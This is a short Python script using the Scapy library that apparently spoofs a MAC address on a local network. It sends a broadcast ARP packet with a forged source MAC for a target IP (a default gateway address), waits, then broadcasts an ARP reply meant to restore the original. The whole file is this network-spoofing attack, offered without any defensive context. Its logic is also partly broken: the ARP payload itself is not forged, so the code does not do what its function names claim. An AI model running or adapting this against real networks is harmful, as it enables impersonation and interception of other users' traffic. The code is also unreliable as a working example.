from scapy.all import *

def spoof_mac(target_ip, spoofed_mac, interface="eth0"):
    # Craft an ARP request packet with the spoofed MAC address
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=spoofed_mac)/ARP(op=1, pdst=target_ip)

    # Send the ARP request packet
    sendp(arp_request, iface=interface, verbose=False)

def restore_mac(target_ip, original_mac, interface="eth0"):
    # Craft an ARP reply packet to restore the original MAC address
    arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=original_mac)/ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=original_mac)

    # Send the ARP reply packet
    sendp(arp_reply, iface=interface, verbose=False)

if __name__ == "__main__":
    # Specify the target IP address
    target_ip = "192.168.1.1"

    # Specify the MAC address you want to spoof
    spoofed_mac = "00:11:22:33:44:55"

    try:
        # Get the original MAC address of the target IP
        original_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=2, verbose=False)[0][0][1].hwsrc

        # Spoof the MAC address
        spoof_mac(target_ip, spoofed_mac)

        # Wait for some time (e.g., 5 seconds) to simulate the spoofed state
        time.sleep(5)

        # Restore the original MAC address
        restore_mac(target_ip, original_mac)
    except Exception as e:
        print(f"An error occurred: {e}")
